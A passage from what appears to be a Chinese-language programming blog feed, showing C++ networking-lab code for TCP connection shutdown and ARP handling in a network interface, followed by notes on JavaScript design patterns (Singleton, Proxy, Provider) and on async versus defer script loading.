class="hljs-built_in">stream_out</span>().<span class="hljs-built_in">set_error</span>();<br>    _sender.<span class="hljs-built_in">stream_in</span>().<span class="hljs-built_in">set_error</span>();<br>    _active = <span class="hljs-literal">false</span>;<br>    TCPSegment seg = _sender.<span class="hljs-built_in">segments_out</span>().<span class="hljs-built_in">front</span>();<br>    _sender.<span class="hljs-built_in">segments_out</span>().<span class="hljs-built_in">pop</span>();<br>    seg.<span class="hljs-built_in">header</span>().ack = <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">if</span>(_receiver.<span class="hljs-built_in">ackno</span>().<span class="hljs-built_in">has_value</span>())&#123;<br>        seg.<span class="hljs-built_in">header</span>().ackno = _receiver.<span class="hljs-built_in">ackno</span>().<span class="hljs-built_in">value</span>();<br>    &#125;<br>    seg.<span class="hljs-built_in">header</span>().win = _receiver.<span class="hljs-built_in">window_size</span>();<br>    seg.<span class="hljs-built_in">header</span>().rst = <span class="hljs-literal">true</span>;<br>    _segments_out.<span class="hljs-built_in">push</span>(seg);<br><br>&#125;<br><br><span class="hljs-comment">// 干净关闭连接，判断能否干净地关闭连接，</span><br><span class="hljs-comment">// 判断是否需要在两个流结束后linger一段时间</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TCPConnection::clean_shutdown</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">// 自己的接收的StreamReassembler（重组缓存）为空</span><br>    <span class="hljs-keyword">if</span>(_receiver.<span class="hljs-built_in">stream_out</span>().<span class="hljs-built_in">input_ended</span>())&#123;<br>        <span class="hljs-comment">// 如果sender的输出流还没有结束，即ByteStream不为空，fin还没有发送出去</span><br>        <span class="hljs-keyword">if</span>(!_sender.<span class="hljs-built_in">stream_in</span>().<span class="hljs-built_in">eof</span>())&#123;<br>        <span class="hljs-comment">// 那么需要在两个流结束后linger一段时间</span><br>            _linger_after_streams_finish = <span class="hljs-literal">false</span>;<br>        <span class="hljs-comment">// 如果sender发送了fin，且得到了确认</span><br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(_sender.<span class="hljs-built_in">bytes_in_flight</span>() == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-comment">// 那么只有不需要linger或者linger了指定时间后，才能断开连接</span><br>            <span class="hljs-keyword">if</span>(!_linger_after_streams_finish || <span class="hljs-built_in">time_since_last_segment_received</span>() &gt;= <span class="hljs-number">10</span> * _cfg.rt_timeout)&#123;<br>                _active = <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br> <br><br>  TCPConnection::~<span class="hljs-built_in">TCPConnection</span>() &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">active</span>()) &#123;<br>            cerr &lt;&lt; <span class="hljs-string">&quot;Warning: Unclean shutdown of TCPConnection\n&quot;</span>;<br>            _sender.<span class="hljs-built_in">send_empty_segment</span>();<br>            <span class="hljs-built_in">unclean_shutdown</span>();<br>            <span class="hljs-comment">// Your code here: need to send a RST segment to the peer</span><br>        &#125;<br>    &#125; <span class="hljs-built_in">catch</span> (<span class="hljs-type">const</span> exception &amp;e) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;Exception destructing TCP FSM: &quot;</span> &lt;&lt; e.<span class="hljs-built_in">what</span>() &lt;&lt; std::endl;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs zephir">发送：TCPConnection::write =&gt; send_sender_segments: 遍历Sender的segments，包装其头部，放到一段内存缓存里 =&gt; clean_shutdown: 看下是否需要关闭<br><br>接收：TCPConnection::segment_received =&gt; send_sender_segments 放到一段内存缓存里<br></code></pre></td></tr></table></figure><h2 id="ip">IP</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;network_interface.hh&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;arp_message.hh&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;ethernet_frame.hh&quot;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-comment">// ethernet_address: Ethernet (what ARP calls &quot;hardware&quot;) address of the interface</span><br><span class="hljs-comment">// ip_address: IP (what ARP calls &quot;protocol&quot;) address of the interface</span><br><span class="hljs-comment">// cppcheck-suppress uninitMemberVar</span><br>NetworkInterface::<span class="hljs-built_in">NetworkInterface</span>(<span class="hljs-type">const</span> EthernetAddress &amp;ethernet_address, <span class="hljs-type">const</span> Address &amp;ip_address)<br>    : <span class="hljs-built_in">ethernet_address_</span>(ethernet_address), <span class="hljs-built_in">ip_address_</span>(ip_address)<br>&#123;<br>    cerr &lt;&lt; <span class="hljs-string">&quot;DEBUG: Network interface has Ethernet address &quot;</span> &lt;&lt; <span class="hljs-built_in">to_string</span>(ethernet_address_) &lt;&lt; <span class="hljs-string">&quot; and IP address &quot;</span><br>         &lt;&lt; ip_address.<span class="hljs-built_in">ip</span>() &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// dgram: the IPv4 datagram to be sent</span><br><span class="hljs-comment">// next_hop: the IP address of the interface to send it to (typically a router or default gateway, but</span><br><span class="hljs-comment">// may also be another host if directly connected to the same network as the destination)</span><br><br><span class="hljs-comment">// Note: the Address type can be converted to a uint32_t (raw 32-bit IP address) by using the</span><br><span class="hljs-comment">// Address::ipv4_numeric() method.</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">NetworkInterface::send_datagram</span><span class="hljs-params">(<span class="hljs-type">const</span> InternetDatagram &amp;dgram, <span class="hljs-type">const</span> Address &amp;next_hop)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 下一跳的地址</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> addr_numeric = next_hop.<span class="hljs-built_in">ipv4_numeric</span>();<br><br>    <span class="hljs-comment">/* ARP Table has stored the mapping info, we send the datagram directly */</span><br>  <span class="hljs-comment">// 如果ARP Table包含下一跳的地址，直接</span><br>    <span class="hljs-keyword">if</span> (arp_table_.<span class="hljs-built_in">contains</span>(addr_numeric)) &#123;<br>        EthernetFrame eth_frame;<br>      <span class="hljs-comment">// 当前物理机以太网地址</span><br>        eth_frame.header.src = ethernet_address_;<br>      <span class="hljs-comment">// 目标物理机以太网地址</span><br>        eth_frame.header.dst = arp_table_.<span class="hljs-built_in">at</span>(addr_numeric).eth_addr;<br>        eth_frame.header.type = EthernetHeader::TYPE_IPv4;<br>      <span class="hljs-comment">// 序列化</span><br>        eth_frame.payload = <span class="hljs-built_in">serialize</span>(dgram);<br>      <span class="hljs-comment">// 发乳待发送缓冲区</span><br>        outbound_frames_.<span class="hljs-built_in">push</span>(eth_frame);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// 没有则发送arp请求</span><br>        <span class="hljs-comment">/* ARP Table has no such mapping and we haven&#x27;t send an ARP request for target ip */</span><br>        <span class="hljs-keyword">if</span> (arp_requests_lifetime_.<span class="hljs-built_in">find</span>(addr_numeric) == arp_requests_lifetime_.<span class="hljs-built_in">end</span>()) &#123;<br>            <span class="hljs-comment">// next hop ipv4 addr is not contained in the arp requests waiting list</span><br>            ARPMessage arp_msg;<br>            arp_msg.opcode = ARPMessage::OPCODE_REQUEST;<br>            arp_msg.sender_ip_address = ip_address_.<span class="hljs-built_in">ipv4_numeric</span>();<br>            arp_msg.sender_ethernet_address = ethernet_address_;<br>            arp_msg.target_ip_address = addr_numeric;<br>            arp_msg.target_ethernet_address = &#123;<span class="hljs-comment">/* empty */</span>&#125;;<br><br>            EthernetFrame arp_eth_frame;<br>            arp_eth_frame.header.src = ethernet_address_;<br>            arp_eth_frame.header.dst = ETHERNET_BROADCAST;<br>            arp_eth_frame.header.type = EthernetHeader::TYPE_ARP;<br>            arp_eth_frame.payload = <span class="hljs-built_in">serialize</span>(arp_msg);<br>            outbound_frames_.<span class="hljs-built_in">push</span>(arp_eth_frame);<br><br>          <span class="hljs-comment">// 广播请求</span><br>            arp_requests_lifetime_.<span class="hljs-built_in">emplace</span>(std::<span class="hljs-built_in">make_pair</span>(addr_numeric, ARP_REQUEST_DEFAULT_TTL));<br>        &#125;<br>        <span class="hljs-comment">// We need to store the datagram in the list. After we know the eth addr, we can queue</span><br>        <span class="hljs-comment">// the corresponding dgrams.</span><br>      <span class="hljs-comment">// 广播下一跳的以太网地址的 ARP 请求， 并将 IP 报文放入队列中待 ARP 回复收到后能将其发送出去。</span><br>        arp_datagrams_waiting_list_.<span class="hljs-built_in">emplace_back</span>(std::pair &#123;next_hop, dgram&#125;);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// frame: the incoming Ethernet frame</span><br><span class="hljs-function">optional&lt;InternetDatagram&gt; <span class="hljs-title">NetworkInterface::recv_frame</span><span class="hljs-params">(<span class="hljs-type">const</span> EthernetFrame &amp;frame)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-comment">// 如果当前frame的目标物理机不是当前物理机且也不是广播请求的目标物理机，直接返回</span><br>    <span class="hljs-keyword">if</span> (frame.header.dst != ethernet_address_ &amp;&amp; frame.header.dst != ETHERNET_BROADCAST) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">nullopt</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* IP datagrams，是IP数据报，反序列数据并直接返回datagram */</span><br>    <span class="hljs-keyword">if</span> (frame.header.type == EthernetHeader::TYPE_IPv4) &#123;<br>        InternetDatagram datagram;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> <span class="hljs-built_in">parse</span>(datagram, frame.payload)) &#123;<br>            <span class="hljs-comment">// printf(&quot;[NetworkInterface ERROR]: &#x27;recv_frame&#x27; IPV4 parse error\n&quot;);</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">nullopt</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> datagram;<br>    &#125;<br><br>    <span class="hljs-comment">/* ARP datagrams，广播数据报 */</span><br>    <span class="hljs-keyword">if</span> (frame.header.type == EthernetHeader::TYPE_ARP) &#123;<br>        ARPMessage arp_msg;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> <span class="hljs-built_in">parse</span>(arp_msg, frame.payload)) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[NetworkInterface ERROR]: &#x27;recv_frame&#x27; ARP parse error\n&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">nullopt</span>;<br>        &#125;<br><br>        <span class="hljs-type">const</span> <span class="hljs-type">bool</span> is_arp_request = arp_msg.opcode == ARPMessage::OPCODE_REQUEST<br>                                    &amp;&amp; arp_msg.target_ip_address == ip_address_.<span class="hljs-built_in">ipv4_numeric</span>();<br>        <span class="hljs-comment">// 如果是广播请求，则回复即可</span><br>      <span class="hljs-keyword">if</span> (is_arp_request) &#123;<br>            ARPMessage arp_reply_msg;<br>            arp_reply_msg.opcode = ARPMessage::OPCODE_REPLY;<br>            arp_reply_msg.sender_ip_address = ip_address_.<span class="hljs-built_in">ipv4_numeric</span>();<br>            arp_reply_msg.sender_ethernet_address = ethernet_address_;<br>            arp_reply_msg.target_ip_address = arp_msg.sender_ip_address;<br>            arp_reply_msg.target_ethernet_address = arp_msg.sender_ethernet_address;<br><br>            EthernetFrame arp_reply_eth_frame;<br>            arp_reply_eth_frame.header.src = ethernet_address_;<br>            arp_reply_eth_frame.header.dst = arp_msg.sender_ethernet_address;<br>            arp_reply_eth_frame.header.type = EthernetHeader::TYPE_ARP;<br>            arp_reply_eth_frame.payload = <span class="hljs-built_in">serialize</span>(arp_reply_msg);<br>            outbound_frames_.<span class="hljs-built_in">push</span>(arp_reply_eth_frame);<br>        &#125;<br><br>      <span class="hljs-comment">// 如果是响应，对应上面send发送的广播数据报</span><br>        <span class="hljs-type">const</span> <span class="hljs-type">bool</span> is_arp_response<br>            = arp_msg.opcode == ARPMessage::OPCODE_REPLY &amp;&amp; arp_msg.target_ethernet_address == ethernet_address_;<br><br>        <span class="hljs-comment">// we can get arp info from either ARP request or ARP reply</span><br>        <span class="hljs-keyword">if</span> (is_arp_request || is_arp_response) &#123;<br>          <span class="hljs-comment">// 更新arp_table</span><br>            arp_table_.<span class="hljs-built_in">emplace</span>(std::<span class="hljs-built_in">make_pair</span>(arp_msg.sender_ip_address,<br>                                              <span class="hljs-type">arp_t</span> &#123;arp_msg.sender_ethernet_address, ARP_DEFAULT_TTL&#125;));<br>            <span class="hljs-comment">// delete arp datagrams waiting list，并且发送该存储的请求</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> iter = arp_datagrams_waiting_list_.<span class="hljs-built_in">begin</span>(); iter != arp_datagrams_waiting_list_.<span class="hljs-built_in">end</span>();) &#123;<br>                <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;[ipv4_addr, datagram] = *iter;<br>                <span class="hljs-keyword">if</span> (ipv4_addr.<span class="hljs-built_in">ipv4_numeric</span>() == arp_msg.sender_ip_address) &#123;<br>                    <span class="hljs-built_in">send_datagram</span>(datagram, ipv4_addr);<br>                    iter = arp_datagrams_waiting_list_.<span class="hljs-built_in">erase</span>(iter);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    iter++;<br>                &#125;<br>            &#125;<br>            arp_requests_lifetime_.<span class="hljs-built_in">erase</span>(arp_msg.sender_ip_address);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nullopt</span>;<br>&#125;<br><br><span class="hljs-comment">// ms_since_last_tick: the number of milliseconds since the last call to this method</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">NetworkInterface::tick</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">size_t</span> ms_since_last_tick)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">/* delete expired ARP items in ARP Table */</span><br>    <span class="hljs-comment">// <span class="hljs-doctag">FIXME:</span> Don&#x27;t use &#x27;iter++&#x27; if we have erase current iter&#x27;s data!</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> iter = arp_table_.<span class="hljs-built_in">begin</span>(); iter != arp_table_.<span class="hljs-built_in">end</span>(); <span class="hljs-comment">/* nop */</span>) &#123;<br>        <span class="hljs-keyword">auto</span> &amp;[ipv4_addr_numeric, arp] = *iter;<br>        <span class="hljs-keyword">if</span> (arp.ttl &lt;= ms_since_last_tick) &#123;<br>            iter = arp_table_.<span class="hljs-built_in">erase</span>(iter);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            arp.ttl -= ms_since_last_tick;<br>            iter++;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* delete expired ARP requests */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp;[ipv4_addr, arp_ttl] : arp_requests_lifetime_) &#123;<br>        <span class="hljs-comment">/* resent ARP request if this request has expired，使得任何已经过期的 IP 地址到 Ethernet 地址的映射失效 */</span> <br>        <span class="hljs-keyword">if</span> (arp_ttl &lt;= ms_since_last_tick) &#123;<br>            ARPMessage arp_msg;<br>            arp_msg.opcode = ARPMessage::OPCODE_REQUEST;<br>            arp_msg.sender_ip_address = ip_address_.<span class="hljs-built_in">ipv4_numeric</span>();<br>            arp_msg.sender_ethernet_address = ethernet_address_;<br>            arp_msg.target_ip_address = ipv4_addr;<br>            arp_msg.target_ethernet_address = &#123;<span class="hljs-comment">/* empty */</span>&#125;;<br><br>            EthernetFrame arp_eth_frame;<br>            arp_eth_frame.header.src = ethernet_address_;<br>            arp_eth_frame.header.dst = ETHERNET_BROADCAST;<br>            arp_eth_frame.header.type = EthernetHeader::TYPE_ARP;<br>            arp_eth_frame.payload = <span class="hljs-built_in">serialize</span>(arp_msg);<br>            outbound_frames_.<span class="hljs-built_in">push</span>(arp_eth_frame);<br><br>            <span class="hljs-comment">/* reset ARP ttl for this component */</span><br>            arp_ttl = ARP_REQUEST_DEFAULT_TTL;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            arp_ttl -= ms_since_last_tick;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function">optional&lt;EthernetFrame&gt; <span class="hljs-title">NetworkInterface::maybe_send</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!outbound_frames_.<span class="hljs-built_in">empty</span>()) &#123;<br>        EthernetFrame eth_frame = std::<span class="hljs-built_in">move</span>(outbound_frames_.<span class="hljs-built_in">front</span>());<br>        outbound_frames_.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-keyword">return</span> eth_frame;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nullopt</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ip-router">IP Router</h2><h2 id="together">Together</h2>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/emocoder/2023/07/15/Design%20Pattern/"/>
    <url>/emocoder/2023/07/15/Design%20Pattern/</url>
    
    <content type="html"><![CDATA[<h1id="设计模式渲染模式优化react">设计模式&amp;渲染模式&amp;优化&amp;React</h1><h2 id="design-pattern">Design Pattern</h2><p>Singleton pattern：This <em>single instance</em> can be sharedthroughout our application, which makes Singletons great for managingglobal state in an application.</p><p>特点：</p><ol type="1"><li>Singletons are classes which can be instantiated once</li><li>can be accessed globally</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> instance;<br><span class="hljs-keyword">let</span> counter = <span class="hljs-number">0</span>;<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">if</span> (instance) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;You can only create one instance!&quot;</span>);<br>    &#125;<br>    instance = <span class="hljs-variable language_">this</span>;<br>  &#125;<br> <br>  <span class="hljs-title function_">getInstance</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;<br>  &#125;<br> <br>  <span class="hljs-title function_">getCount</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> counter;<br>  &#125;<br> <br>  <span class="hljs-title function_">increment</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> ++counter;<br>  &#125;<br> <br>  <span class="hljs-title function_">decrement</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> --counter;<br>  &#125;<br>&#125;<br> <br><span class="hljs-keyword">const</span> singletonCounter = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Counter</span>());<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> singletonCounter;<br></code></pre></td></tr></table></figure><h2 id="tradeoffs">Tradeoffs</h2><p>In many programming languages, such as Java or C++, it's not possibleto directly create objects the way we can in JavaScript. In thoseobject-oriented programming languages, we need to create a class, whichcreates an object. That created object has the value of the instance ofthe class, just like the value of <code>instance</code> in theJavaScript example.</p><p>However, the class implementation shown in the examples above isactually overkill. Since we can directly create objects in JavaScript,we can simply use a regular object to achieve the exact same result.Let's cover some of the disadvantages of using Singletons!</p><p>js的字面量很容易写出单粒模式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> count = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">const</span> counter = &#123;<br>  <span class="hljs-title function_">increment</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> ++count;<br>  &#125;,<br>  <span class="hljs-title function_">decrement</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> --count;<br>  &#125;<br>&#125;;<br><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>(counter);<br><span class="hljs-keyword">export</span> &#123; counter &#125;;<br></code></pre></td></tr></table></figure><p>In React, we often rely on a global state through state managementtools such as <strong>Redux</strong> or <strong>React Context</strong>instead of using Singletons. Although their global state behavior mightseem similar to that of a Singleton, these tools provide a<strong>read-only state</strong> rather than the <em>mutable</em> stateof the Singleton. When using Redux, only pure function <em>reducers</em>can update the state, after a component has sent an <em>action</em>through a <em>dispatcher</em>.</p><p>Although the downsides to having a global state don't magicallydisappear by using these tools, we can at least make sure that theglobal state is mutated the way we intend it, since components cannotupdate the state directly.</p><p>Proxy</p><p>代理对象控制了我们和原对象交互时的行为，它拦截了任何action whichinteract with object</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">const person</span> = &#123;<br>  name: <span class="hljs-string">&quot;John Doe&quot;</span>,<br>  age: 42,<br>  nationality: <span class="hljs-string">&quot;American&quot;</span>,<br>&#125;;<br> <br><span class="hljs-attribute">const personProxy</span> = new Proxy(person, &#123;&#125;);<br></code></pre></td></tr></table></figure><p>https://res.cloudinary.com/ddxwdqwkr/video/upload/f_auto/v1609056520/patterns.dev/jspat-51_xvbob9.mp4</p><p>Provider</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">DataContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>()<br> <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> data = &#123; ... &#125;<br> <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">DataContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;data&#125;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">SideBar</span> /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Content</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">DataContext.Provider</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br></code></pre></td></tr></table></figure><p>https://res.cloudinary.com/ddxwdqwkr/video/upload/f_auto/v1609056518/patterns.dev/jspat-48_jxmuyy.mp4</p><p>Prototype</p><h2 id="performance">Performance</h2><h3 id="preload-vs-prefetch">preload vs prefetch</h3><h3 id="async-vs-defer">async vs defer</h3><p>现代的网站中，脚本往往比 HTML更“重”：它们的大小通常更大，处理时间也更长。</p><p>当浏览器加载 HTML 时遇到<code>&lt;script&gt;...&lt;/script&gt;</code> 标签，浏览器就不能继续构建DOM。它必须立刻执行此脚本。对于外部脚本<code>&lt;script src="..."&gt;&lt;/script&gt;</code>也是一样的：浏览器必须等脚本下载完，并执行结束，之后才能继续处理剩余的页面。</p><p>这会导致两个重要的问题：</p><ol type="1"><li>脚本不能访问到位于它们下面的 DOM元素，因此，脚本无法给它们添加处理程序等。</li><li>如果页面顶部有一个笨重的脚本，它会“阻塞页面”。在该脚本下载并执行结束前，用户都不能看到页面内容</li></ol><p>🌰：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 